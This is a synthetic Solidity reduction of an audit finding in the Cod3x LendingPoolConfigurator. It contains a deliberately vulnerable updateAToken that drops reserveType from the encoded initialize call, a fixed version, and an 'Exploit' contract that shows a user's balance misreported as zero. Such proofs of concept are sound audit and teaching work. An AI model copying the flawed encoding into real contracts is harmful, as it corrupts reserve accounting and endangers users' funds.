// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Cod3x LendingPoolConfigurator — updateAToken omits reserveType (Spearbit, 49177)
    SYNTHETIC, cheatcode-free reduction.
    Root cause: abi.encodeWithSelector drops reserveType after decimals. The aToken
    reads that word as its reserve index, so balanceOf is the wrong reserve. */

interface IInitializableAToken {
    function initialize(
        address pool,
        address asset,
        address incentivesController,
        uint8 decimals,
        uint256 reserveType,
        string calldata name,
        string calldata symbol,
        bytes calldata params
    ) external;
}

contract AToken {
    uint256 public reserveType;
    mapping(uint256 => mapping(address => uint256)) public balances;

    function deposit(uint256 index, address user, uint256 amount) external {
        balances[index][user] += amount;
    }

    function balanceOf(address user) external view returns (uint256) {
        return balances[reserveType][user];
    }

    function applyUpdate(bytes calldata encodedCall) external returns (uint256 shifted) {
        shifted = _word(encodedCall, 4);
        reserveType = shifted;
    }

    function _word(bytes calldata data, uint256 i) internal pure returns (uint256 w) {
        // @> VULN: word 4 is the next argument, not reserveType, because the encoder skipped it
        assembly {
            w := calldataload(add(data.offset, add(4, mul(i, 32))))
        }
    }
}

contract LendingPoolConfigurator {
    address public cachedPool;
    AToken public aToken;

    struct UpdateATokenInput {
        address asset;
        address incentivesController;
        uint8 decimals;
        string name;
        string symbol;
        bytes params;
    }

    constructor(address pool, AToken token) {
        cachedPool = pool;
        aToken = token;
    }

    function updateAToken(UpdateATokenInput memory input) external returns (uint256 applied) {
        bytes memory encodedCall = abi.encodeWithSelector(
            IInitializableAToken.initialize.selector,
            cachedPool,
            input.asset,
            input.incentivesController,
            input.decimals,
            input.name,
            input.symbol,
            input.params
        );
        applied = aToken.applyUpdate(encodedCall);
    }

    function updateATokenFixed(UpdateATokenInput memory input, uint256 reserveType) external returns (uint256 applied) {
        bytes memory encodedCall = abi.encodeWithSelector(
            IInitializableAToken.initialize.selector,
            cachedPool,
            input.asset,
            input.incentivesController,
            input.decimals,
            reserveType,
            input.name,
            input.symbol,
            input.params
        );
        applied = aToken.applyUpdate(encodedCall);
    }
}

contract Exploit {
    uint256 public constant N = 1000 ether;
    address public constant USER = 0x3333333333333333333333333333333333333333;

    AToken public broken; // nonce 1
    AToken public fixedToken; // nonce 2
    LendingPoolConfigurator public cfg; // nonce 3
    LendingPoolConfigurator public cfgFixed; // nonce 4

    uint256 public reported;
    uint256 public fair;
    uint256 public offBy;
    uint256 public storedIndex;
    uint256 public controlBalance;

    constructor() {
        broken = new AToken();
        fixedToken = new AToken();
        cfg = new LendingPoolConfigurator(address(this), broken);
        cfgFixed = new LendingPoolConfigurator(address(this), fixedToken);
        broken.deposit(1, USER, N);
        fixedToken.deposit(1, USER, N);
    }

    function run() external {
        LendingPoolConfigurator.UpdateATokenInput memory input = LendingPoolConfigurator.UpdateATokenInput({
            asset: address(0xA11CE),
            incentivesController: address(0xB0B),
            decimals: 18,
            name: "aWETH",
            symbol: "aWETH",
            params: ""
        });
        fair = N;
        storedIndex = cfg.updateAToken(input);
        reported = broken.balanceOf(USER);
        offBy = fair - reported;
        require(storedIndex == 224, "shifted index");
        require(reported == 0, "reported");
        require(offBy == N, "off by N");

        uint256 fixedIndex = cfgFixed.updateATokenFixed(input, 1);
        controlBalance = fixedToken.balanceOf(USER);
        require(fixedIndex == 1, "control index");
        require(controlBalance == N, "control balance");
    }
}
